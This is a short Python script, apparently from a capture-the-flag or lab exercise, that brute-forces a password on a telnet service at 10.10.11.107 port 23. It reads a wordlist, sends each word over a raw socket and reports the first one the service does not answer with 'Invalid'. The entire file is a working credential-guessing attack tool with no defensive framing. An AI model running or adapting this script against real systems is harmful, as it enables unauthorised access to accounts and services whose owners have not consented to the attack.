import socket

with open(str(input("w: "))) as f:
	wordlist = f.read()

for word in wordlist.splitlines():
	s = socket.socket()
	s.connect(("10.10.11.107", 23))
	s.recv(128)
	s.send(b"\n")
	s.recv(128)
	s.send(word.encode())
	if "Invalid" not in s.recv(128).decode():
		print(f"{word}: VALID!")
		s.close()
		break
	print(f"{word}: wrong!")
	s.close()
